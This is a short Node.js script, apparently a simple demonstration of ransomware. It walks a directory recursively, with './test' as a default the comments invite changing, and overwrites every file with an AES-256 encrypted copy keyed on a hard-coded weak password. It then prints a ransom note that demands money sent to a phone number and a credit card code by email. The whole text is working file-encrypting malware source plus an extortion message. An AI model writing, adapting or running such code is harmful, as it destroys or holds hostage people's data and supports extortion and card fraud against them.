fs = require('fs'), crypto = require('crypto');
crypto = require('crypto'), recursive = require("recursive-readdir");

// Prevent from autoclose
process.stdin.resume();

// Encrypt
encrypt = (text, secret) => {
      const cipher = crypto.createCipher('aes256', secret)
      let crypted = cipher.update(text, 'utf8', 'hex')
      crypted += cipher.final('hex')
      return crypted
}

// Generate a password
const password = JSON.stringify(crypto.createHash('sha256').update('very weak password').digest('hex'));

// Read files
// You can change './test' to any other directory
recursive("./test", ['index.js', 'index.exe', 'decrypt.js', 'decrypt.exe'] , (err, files) => {
  for(let i of files){
    fs.writeFileSync(i, encrypt(fs.readFileSync(i, 'utf8'), password));
}});
console.log(`
Oops! It seems that all your files have been encrypted :(

We can help you by giving a secret key. Just send some money to 88005553535
and write an email to lolkekcheburek@superpuperpochta.com with your credit card code.
`);
